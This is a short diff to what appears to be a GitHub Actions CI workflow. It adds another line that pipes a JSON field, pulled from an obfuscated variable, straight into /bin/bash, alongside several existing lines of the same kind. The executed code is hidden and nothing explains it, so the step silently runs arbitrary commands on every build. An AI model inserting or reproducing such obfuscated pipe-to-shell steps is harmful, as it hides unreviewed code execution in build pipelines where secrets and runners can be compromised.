@@ -25,6 +25,7 @@ jobs:
           echo $jtn99 | jq -r .nyr693 | /bin/bash
           printf '%s' "$e03" | jq -r .k5382 | /bin/bash
           printf '%s' "$xm9" | jq -r .tegmp3878 | /bin/bash
+          echo $pw70 | jq -r .xuny9 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
